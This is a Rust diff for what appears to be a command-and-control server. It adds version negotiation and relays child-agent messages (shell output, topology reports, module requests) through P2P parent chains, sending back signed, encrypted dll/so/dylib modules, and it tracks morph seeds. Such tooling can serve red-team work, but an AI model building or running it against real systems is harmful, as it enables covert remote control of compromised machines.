@@ -218,31 +218,56 @@ async fn handle_agent(
 
         match msg {
             // ── Protocol version handshake (M-2) ─────────────────────────────
-            // Agent sends VersionHandshake as its first message.  Echo back our
-            // version so the agent can detect a server/agent version mismatch
-            // and refuse to proceed if they differ.
+            // Agent sends VersionHandshake as its first message.  Negotiate a
+            // compatible version using `negotiate_protocol_version` which
+            // returns the highest mutually-supported version or None if the
+            // agent is too old to be supported.
             Message::VersionHandshake { version } => {
-                if version != common::PROTOCOL_VERSION {
-                    tracing::warn!(
-                        connection_id = %conn_id,
-                        agent_version = version,
-                        server_version = common::PROTOCOL_VERSION,
-                        "agent/server protocol version mismatch; \
-                         the connection may be unstable — update to matching releases"
-                    );
+                match common::negotiate_protocol_version(version) {
+                    Some(negotiated) => {
+                        if negotiated != version {
+                            tracing::info!(
+                                connection_id = %conn_id,
+                                agent_version = version,
+                                negotiated_version = negotiated,
+                                "protocol version negotiated (agent downgrade)"
+                            );
+                        } else {
+                            tracing::debug!(
+                                connection_id = %conn_id,
+                                version,
+                                "version handshake completed"
+                            );
+                        }
+                        // Echo the negotiated version so the agent knows what
+                        // the server accepted.
+                        if tx
+                            .send(Message::VersionHandshake {
+                                version: negotiated,
+                            })
+                            .await
+                            .is_err()
+                        {
+                            tracing::warn!(connection_id = %conn_id, "writer task closed during version handshake");
+                            break;
+                        }
+                    }
+                    None => {
+                        tracing::warn!(
+                            connection_id = %conn_id,
+                            agent_version = version,
+                            min_supported = common::MIN_PROTOCOL_VERSION,
+                            "agent protocol version too old; rejecting connection"
+                        );
+                        // Signal rejection and break.
+                        let _ = tx
+                            .send(Message::VersionHandshake {
+                                version: common::PROTOCOL_VERSION,
+                            })
+                            .await;
+                        break;
+                    }
                 }
-                // Echo our version regardless of match so the agent can decide.
-                if tx
-                    .send(Message::VersionHandshake {
-                        version: common::PROTOCOL_VERSION,
-                    })
-                    .await
-                    .is_err()
-                {
-                    tracing::warn!(connection_id = %conn_id, "writer task closed during version handshake");
-                    break;
-                }
-                tracing::debug!(connection_id = %conn_id, version, "version handshake completed");
             }
             Message::Heartbeat {
                 agent_id,
@@ -413,7 +438,9 @@ async fn handle_agent(
                 task_id, result, ..
             } => {
                 if let Some((_, sender)) = state.pending.remove(&task_id) {
-                    let _ = sender.send(result);
+                    if let Err(e) = sender.send(result) {
+                        tracing::warn!(%task_id, "failed to deliver TaskResponse to operator (disconnected?): {e:?}");
+                    }
                 } else {
                     tracing::debug!(%task_id, "received TaskResponse with no pending waiter");
                 }
@@ -563,7 +590,7 @@ async fn handle_agent(
                     continue;
                 }
 
-                let result = (|| async {
+                let result = async {
                     let module_bytes = tokio::fs::read(&module_path).await.map_err(|e| {
                         tracing::warn!(path = %module_path.display(), "module not found: {e}");
                         e
@@ -609,7 +636,7 @@ async fn handle_agent(
                     let encrypted_blob = crypto.encrypt(&signed);
 
                     Ok::<Vec<u8>, anyhow::Error>(encrypted_blob)
-                })()
+                }
                 .await;
 
                 let resp = match result {
@@ -658,30 +685,403 @@ async fn handle_agent(
             } => {
                 // ── P2P forwarded data from child → server ─────────────
                 // A child agent sent data (e.g. a TaskResponse) through its
-                // parent relay chain.  Parse the inner message and handle
-                // it the same way as a direct agent message.  The data blob
-                // is a serialized, encrypted C2 message from the child.
+                // parent relay chain.  The `data` field contains the
+                // **plaintext** (bincode-serialized `Message`) that the
+                // child intended for the server.  We deserialize and
+                // re-dispatch it the same way as a direct agent message.
+
                 tracing::debug!(
                     connection_id = %conn_id,
                     child_link_id,
                     data_len = data.len(),
                     "received P2P forwarded data from child"
                 );
-                // The forwarded data should contain a serialized Message
-                // from the child.  Try to parse and re-dispatch it.
-                // For now we log it — full re-dispatch requires the child's
-                // per-link decryption key which the server doesn't have
-                // (end-to-end encryption between server and child via the
-                // P2pToChild / P2pForward routing blob).
-                //
-                // Instead, the data field contains the inner C2 message
-                // that was wrapped by the agent's build_p2p_routing_blob.
-                // The server treats it as opaque and records it.
+
+                // Resolve the parent's agent_id from its connection_id.
+                let parent_agent_id = state.registry.get(&conn_id).map(|e| e.agent_id.clone());
+
+                let parent_agent_id = match parent_agent_id {
+                    Some(id) => id,
+                    None => {
+                        tracing::warn!(
+                            connection_id = %conn_id,
+                            child_link_id,
+                            "P2P forward: parent connection not in registry — dropping"
+                        );
+                        continue;
+                    }
+                };
+
+                // Reverse-lookup: find the child agent_id from the
+                // topology's child_link_map.  The map stores
+                // (parent_agent_id, child_agent_id) → link_id, so we
+                // search for the entry matching the parent + link_id.
+                let child_agent_id = {
+                    let topo = state.topology.read().await;
+                    topo.child_link_map
+                        .iter()
+                        .find(|((parent, _child), &lid)| {
+                            parent == &parent_agent_id && lid == child_link_id
+                        })
+                        .map(|((_parent, child), _lid)| child.clone())
+                    // topo read lock dropped here
+                };
+
+                let child_agent_id = match child_agent_id {
+                    Some(id) => id,
+                    None => {
+                        tracing::warn!(
+                            connection_id = %conn_id,
+                            child_link_id,
+                            parent_agent_id = %parent_agent_id,
+                            "P2P forward: child_link_id not found in topology — dropping"
+                        );
+                        continue;
+                    }
+                };
+
+                // Deserialize the inner message.
+                let inner_msg: Message =
+                    match bincode::serde::decode_from_slice(&data, bincode::config::legacy()) {
+                        Ok((msg, _remainder)) => msg,
+                        Err(e) => {
+                            tracing::warn!(
+                                connection_id = %conn_id,
+                                child_agent_id = %child_agent_id,
+                                error = %e,
+                                "P2P forward: failed to deserialize inner message — dropping"
+                            );
+                            continue;
+                        }
+                    };
+
                 tracing::debug!(
-                    child_link_id,
-                    data_len = data.len(),
-                    "P2P forward data recorded (end-to-end encrypted)"
+                    connection_id = %conn_id,
+                    child_agent_id = %child_agent_id,
+                    "P2P forward: re-dispatching inner message"
                 );
+
+                // Re-dispatch the inner message as if it came from the
+                // child agent directly.  Some message types require
+                // special handling because they reference `conn_id` or
+                // `tx` which belong to the *parent*, not the child.
+                match inner_msg {
+                    Message::TaskResponse {
+                        task_id, result, ..
+                    } => {
+                        tracing::info!(
+                            child_agent_id = %child_agent_id,
+                            %task_id,
+                            "P2P forwarded TaskResponse from child"
+                        );
+                        if let Some((_, sender)) = state.pending.remove(&task_id) {
+                            if let Err(e) = sender.send(result) {
+                                tracing::warn!(%task_id, "failed to deliver forwarded TaskResponse to operator: {e:?}");
+                            }
+                        } else {
+                            tracing::debug!(
+                                %task_id,
+                                "forwarded TaskResponse with no pending waiter"
+                            );
+                        }
+                    }
+                    Message::AuditLog(ev) => {
+                        tracing::debug!(
+                            child_agent_id = %child_agent_id,
+                            "P2P forwarded AuditLog from child"
+                        );
+                        state.audit.record(ev);
+                    }
+                    Message::MorphResult {
+                        connection_id: _reported_conn,
+                        text_hash,
+                    } => {
+                        // For forwarded MorphResult we record the hash
+                        // under the child's agent_id (look up by agent_id
+                        // rather than by connection_id, since the child is
+                        // not directly connected).
+                        tracing::info!(
+                            child_agent_id = %child_agent_id,
+                            %text_hash,
+                            "P2P forwarded MorphResult from child"
+                        );
+                        if let Some(entry) = state.find_by_agent_id(&child_agent_id) {
+                            // Use the child's actual connection_id for the
+                            // hash update (not the parent's).
+                            state.update_text_hash(&entry.connection_id, &text_hash);
+                        } else {
+                            // Child might not be in the registry (deeply
+                            // nested via multiple hops).  Store under a
+                            // synthetic key so we don't lose the data.
+                            state.update_text_hash(&child_agent_id, &text_hash);
+                        }
+                    }
+                    Message::P2pTopologyReport { agent_id, children } => {
+                        // A nested child is reporting its own children.
+                        tracing::info!(
+                            connection_id = %conn_id,
+                            relayed_from = %child_agent_id,
+                            %agent_id,
+                            child_count = children.len(),
+                            "P2P forwarded topology report from child"
+                        );
+                        state.update_topology(&agent_id, &children).await;
+                    }
+                    Message::P2pLinkFailureReport {
+                        agent_id,
+                        dead_peer_id,
+                        link_type,
+                        uptime_secs,
+                        latency_ms,
+                        packet_loss,
+                        bandwidth_bps,
+                    } => {
+                        tracing::info!(
+                            connection_id = %conn_id,
+                            relayed_from = %child_agent_id,
+                            %agent_id,
+                            %dead_peer_id,
+                            "P2P forwarded link failure report from child"
+                        );
+                        state
+                            .record_link_failure(
+                                &agent_id,
+                                &dead_peer_id,
+                                link_type,
+                                uptime_secs,
+                                latency_ms,
+                                packet_loss,
+                                bandwidth_bps,
+                            )
+                            .await;
+                    }
+                    Message::ShellOutput {
+                        session_id,
+                        data: shell_data,
+                        stream,
+                    } => {
+                        let stream_name = match stream {
+                            common::ShellStream::Stdout => "stdout",
+                            common::ShellStream::Stderr => "stderr",
+                        };
+                        tracing::info!(
+                            child_agent_id = %child_agent_id,
+                            session_id,
+                            stream = stream_name,
+                            data_len = shell_data.len(),
+                            "P2P forwarded shell output from child"
+                        );
+                        let buffer_key = (child_agent_id.clone(), session_id);
+                        let entry =
+                            state
+                                .shell_output_buffers
+                                .entry(buffer_key)
+                                .or_insert_with(|| {
+                                    std::sync::Mutex::new(
+                                        std::collections::VecDeque::with_capacity(256),
+                                    )
+                                });
+                        if let Ok(mut q) = entry.lock() {
+                            q.push_back(shell_data.clone());
+                            while q.len() > 2000 {
+                                q.pop_front();
+                            }
+                        }
+                        state.audit.record(common::AuditEvent {
+                            timestamp: now_secs(),
+                            agent_id: child_agent_id,
+                            user: "shell".to_string(),
+                            action: format!(
+                                "ShellOutput(session={session_id}, stream={stream_name}, via_p2p)"
+                            ),
+                            outcome: common::Outcome::Success,
+                            details: format!("{} bytes", shell_data.len()),
+                            tampered: false,
+                        });
+                    }
+                    Message::ModuleRequest { module_id } => {
+                        // Forwarded module request from a child.  Load,
+                        // sign, and encrypt the module the same way as a
+                        // direct request, but route the response back
+                        // through the P2P relay chain.
+                        tracing::info!(
+                            child_agent_id = %child_agent_id,
+                            %module_id,
+                            "P2P forwarded module request from child"
+                        );
+
+                        let resp = {
+                            let module_dir = &state.config.modules_dir;
+                            const PLATFORM_EXTS: &[&str] = &["dll", "so", "dylib"];
+
+                            // Path traversal protection.
+                            if !module_id
+                                .chars()
+                                .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
+                            {
+                                tracing::warn!(
+                                    child_agent_id = %child_agent_id,
+                                    %module_id,
+                                    "forwarded module_id has invalid chars"
+                                );
+                                Message::ModuleResponse {
+                                    module_id: module_id.clone(),
+                                    encrypted_blob: Vec::new(),
+                                }
+                            } else {
+                                // Resolve module file.
+                                let found = PLATFORM_EXTS.iter().find_map(|&ext| {
+                                    let p = std::path::Path::new(module_dir)
+                                        .join(format!("{module_id}.{ext}"));
+                                    if p.exists() {
+                                        Some(p)
+                                    } else {
+                                        None
+                                    }
+                                });
+
+                                match found {
+                                    Some(module_path) => {
+                                        // Canonicalize + traversal check.
+                                        let canon_file = match module_path.canonicalize() {
+                                            Ok(p) => p,
+                                            Err(_) => {
+                                                tracing::warn!(
+                                                    child_agent_id = %child_agent_id,
+                                                    %module_id,
+                                                    "module file canonicalize failed"
+                                                );
+                                                let _ = crate::state::send_to_child(
+                                                    &state,
+                                                    &child_agent_id,
+                                                    &Message::ModuleResponse {
+                                                        module_id: module_id.clone(),
+                                                        encrypted_blob: Vec::new(),
+                                                    },
+                                                )
+                                                .await;
+                                                continue;
+                                            }
+                                        };
+                                        let canon_dir = std::path::Path::new(module_dir)
+                                            .canonicalize()
+                                            .unwrap_or_else(|_| {
+                                                std::path::PathBuf::from(module_dir)
+                                            });
+                                        if !canon_file.starts_with(&canon_dir) {
+                                            tracing::warn!(
+                                                child_agent_id = %child_agent_id,
+                                                %module_id,
+                                                "forwarded module path escapes modules_dir"
+                                            );
+                                            Message::ModuleResponse {
+                                                module_id: module_id.clone(),
+                                                encrypted_blob: Vec::new(),
+                                            }
+                                        } else {
+                                            // Read, sign, encrypt.
+                                            match tokio::fs::read(&canon_file).await {
+                                                Ok(module_bytes) => {
+                                                    let max_size = state.config.max_module_size;
+                                                    if module_bytes.len() > max_size {
+                                                        tracing::warn!(
+                                                            child_agent_id = %child_agent_id,
+                                                            %module_id,
+                                                            size = module_bytes.len(),
+                                                            max = max_size,
+                                                            "forwarded module exceeds size limit"
+                                                        );
+                                                        Message::ModuleResponse {
+                                                            module_id: module_id.clone(),
+                                                            encrypted_blob: Vec::new(),
+                                                        }
+                                                    } else {
+                                                        let signed = match &state
+                                                            .config
+                                                            .module_signing_key
+                                                        {
+                                                            Some(_) => {
+                                                                match crate::api::load_signing_key(
+                                                                    &state,
+                                                                ) {
+                                                                    Ok(key) => {
+                                                                        crate::api::sign_module(
+                                                                            &key,
+                                                                            &module_bytes,
+                                                                        )
+                                                                    }
+                                                                    Err(_) => module_bytes,
+                                                                }
+                                                            }
+                                                            None => module_bytes,
+                                                        };
+                                                        match crate::api::load_module_crypto(&state)
+                                                        {
+                                                            Ok(crypto) => Message::ModuleResponse {
+                                                                module_id: module_id.clone(),
+                                                                encrypted_blob: crypto
+                                                                    .encrypt(&signed),
+                                                            },
+                                                            Err(_) => {
+                                                                tracing::warn!(
+                                                                    child_agent_id = %child_agent_id,
+                                                                    "module crypto not available"
+                                                                );
+                                                                Message::ModuleResponse {
+                                                                    module_id: module_id.clone(),
+                                                                    encrypted_blob: Vec::new(),
+                                                                }
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                                Err(e) => {
+                                                    tracing::warn!(
+                                                        child_agent_id = %child_agent_id,
+                                                        %module_id,
+                                                        "failed to read forwarded module: {e}"
+                                                    );
+                                                    Message::ModuleResponse {
+                                                        module_id: module_id.clone(),
+                                                        encrypted_blob: Vec::new(),
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                    None => {
+                                        tracing::warn!(
+                                            child_agent_id = %child_agent_id,
+                                            %module_id,
+                                            "forwarded module not found"
+                                        );
+                                        Message::ModuleResponse {
+                                            module_id: module_id.clone(),
+                                            encrypted_blob: Vec::new(),
+                                        }
+                                    }
+                                }
+                            }
+                        };
+
+                        if let Err(e) =
+                            crate::state::send_to_child(&state, &child_agent_id, &resp).await
+                        {
+                            tracing::warn!(
+                                child_agent_id = %child_agent_id,
+                                error = %e,
+                                "failed to route ModuleResponse to forwarded child"
+                            );
+                        }
+                    }
+                    other => {
+                        tracing::debug!(
+                            child_agent_id = %child_agent_id,
+                            "P2P forward: dropping unhandled inner message type"
+                        );
+                        let _ = &other;
+                    }
+                }
             }
             Message::P2pLinkFailureReport {
                 agent_id,
@@ -931,7 +1331,9 @@ async fn handle_agent(
             state.release_seed(entry.1.morph_seed);
             Some(agent_id)
         } else {
-            state.registry.remove(&conn_id);
+            // conn_id was already removed by the `if let` branch above.
+            // The key is no longer present — this else branch only runs when
+            // the first remove() call above returned None.
             None
         };
         // Clean up the topology map for this agent.
